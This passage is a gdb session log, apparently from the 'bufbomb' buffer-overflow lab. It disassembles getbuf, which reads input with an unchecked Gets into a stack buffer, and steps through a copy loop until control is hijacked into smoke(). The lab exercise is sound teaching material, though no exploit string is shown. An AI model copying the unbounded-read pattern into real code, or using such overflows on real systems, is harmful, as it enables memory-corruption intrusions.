   0x0000000000400e19 <+121>:	leaveq 
   0x0000000000400e1a <+122>:	retq   
---Type <return> to continue, or q <return> to quit---
End of assembler dump.
(gdb) n
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) disas
Dump of assembler code for function getbuf:
   0x0000000000400da0 <+0>:	push   %rbp
   0x0000000000400da1 <+1>:	mov    %rsp,%rbp
   0x0000000000400da4 <+4>:	sub    $0x30,%rsp
   0x0000000000400da8 <+8>:	lea    -0x30(%rbp),%rdi
   0x0000000000400dac <+12>:	callq  0x400cb0 <Gets>
   0x0000000000400db1 <+17>:	movabs $0xcccccccccccccccd,%rdx
   0x0000000000400dbb <+27>:	mov    %rax,%rcx
   0x0000000000400dbe <+30>:	mul    %rdx
   0x0000000000400dc1 <+33>:	shr    $0x5,%rdx
   0x0000000000400dc5 <+37>:	lea    (%rdx,%rdx,4),%rax
   0x0000000000400dc9 <+41>:	mov    %rcx,%rdx
   0x0000000000400dcc <+44>:	shl    $0x3,%rax
   0x0000000000400dd0 <+48>:	sub    %rax,%rdx
   0x0000000000400dd3 <+51>:	mov    $0x24,%eax
   0x0000000000400dd8 <+56>:	cmp    $0x24,%rdx
   0x0000000000400ddc <+60>:	cmovae %rdx,%rax
   0x0000000000400de0 <+64>:	xor    %ecx,%ecx
   0x0000000000400de2 <+66>:	add    $0x1e,%rax
   0x0000000000400de6 <+70>:	and    $0xfffffffffffffff0,%rax
   0x0000000000400dea <+74>:	sub    %rax,%rsp
   0x0000000000400ded <+77>:	lea    0xf(%rsp),%r8
   0x0000000000400df2 <+82>:	and    $0xfffffffffffffff0,%r8
   0x0000000000400df6 <+86>:	nopw   %cs:0x0(%rax,%rax,1)
   0x0000000000400e00 <+96>:	movzbl -0x30(%rbp,%rcx,1),%edi
=> 0x0000000000400e05 <+101>:	lea    (%r8,%rcx,1),%rsi
   0x0000000000400e09 <+105>:	add    $0x1,%rcx
   0x0000000000400e0d <+109>:	cmp    $0x24,%rcx
   0x0000000000400e11 <+113>:	mov    %dil,(%rsi)
   0x0000000000400e14 <+116>:	jne    0x400e00 <getbuf+96>
   0x0000000000400e16 <+118>:	mov    %rdx,%rax
   0x0000000000400e19 <+121>:	leaveq 
   0x0000000000400e1a <+122>:	retq   
---Type <return> to continue, or q <return> to quit---
End of assembler dump.
(gdb) n
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) info lo
buf = '\000' <repeats 35 times>
variable_length = 0x7fffffffbb10 ""
val = <optimized out>
(gdb) n
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
138	  for(i = 0; i < 36; i++)
(gdb) 
143	}
(gdb) 
smoke () at bufbomb.c:63
63	{
(gdb) 
65	  printf("Smoke!: You called smoke()\n");
(gdb) 
64	  entry_check(0);  /* Make sure entered this function properly */
(gdb) 
65	  printf("Smoke!: You called smoke()\n");
(gdb) 


Type string: Smoke!: You called smoke()
66	  validate(0);
(gdb) 
67	  exit(0);
(gdb) 
[Inferior 1 (process 6521) exited normally]
(gdb) 
The program is not being run.
(gdb) 
The program is not being run.
(gdb) 

